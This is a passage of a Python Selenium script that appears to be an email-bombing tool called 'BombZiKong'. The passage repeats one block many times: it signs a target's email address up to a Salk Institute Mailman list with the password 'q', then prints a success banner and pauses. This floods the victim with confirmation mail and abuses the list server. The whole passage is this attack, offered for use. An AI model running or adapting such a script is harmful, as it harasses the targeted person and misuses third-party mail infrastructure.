print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



